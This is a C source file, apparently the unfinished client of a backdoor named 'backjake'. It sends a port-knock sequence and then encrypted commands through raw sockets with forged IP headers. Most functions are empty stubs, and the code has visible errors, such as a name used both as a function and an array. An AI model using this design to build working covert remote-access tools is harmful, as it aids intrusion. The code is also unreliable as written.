#include "backjake.h"

// Function Prototypes
static void sig_alrm (int);
void cleanup (void);

void client()
{
    knockCode(); // read and send the knock code
    listenThread(); // create the thread for listening 
    encryptCommand(getCommand());  // read the user command, thenencrypt the command
    sendCommand(); // send the command
}

void knockCode()
{
    size_t m = 0;
    size_t len = sizeof(knockCode) / sizeof(knockCode[0]);
    
    for (m = 0; m < len; m++)
    {
        sendPacket(forgeKnock(knockCode[m]));
    }
}

void forgeKnock()
{
    
}

void sendCommand()
{

}

void encryptCommand() 
{

}

void getCommand()
{
    
}


void* listenThread(void * arg)
{
    // wait for authentication packet
        // wait for mutex 
        // start listening for results
        // read packets until you see the ender packet
        // decrypt the packets
}

void* SendDatagram (void *addr_ptr)
{
    //IP_HDRINCL to stop the kernel from building the packet headers 
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (UserAddr->RawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            perror ("setsockopt");
    }
    
    // Set up the signals
    if (signal(SIGALRM, sig_alrm) == SIG_ERR)
        perror("signal(SIGALRM) error");
    printf("starting the scan: \n");  
    
    //lock the mutex
    //pthread_mutex_lock (&ThreadLock);

    if (sigsetjmp(jmpbuf, 1)) 
    {
        pthread_mutex_lock (&ThreadLock);
        if (ExitFlag == TRUE)
            cleanup();
        
        //Send the packet
        if (sendto (UserAddr->RawSocket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror ("sendto");
            exit (1);
        }
        else    //Data sent successfully
        {
            if (nsent > 0)
                printf("timeout\n");
            printf ("Datagram Sent!\n");
            nsent++;
            timeout *= 2;   // increase the timeout exponentially
        }
    }
        canjump = 1;            // sigsetjmp ready
    alarm (timeout);    // initialize the signal 
    
    for (; ;)
    {
        if (nsent == 3)
        {
            printf ("No response..quiting\n");
            //fflush (stdout);
            break;
        }
        if (ExitFlag == TRUE)
            break;
        pthread_mutex_lock (&ThreadLock);       
    }
    cleanup();
    return NULL;
}

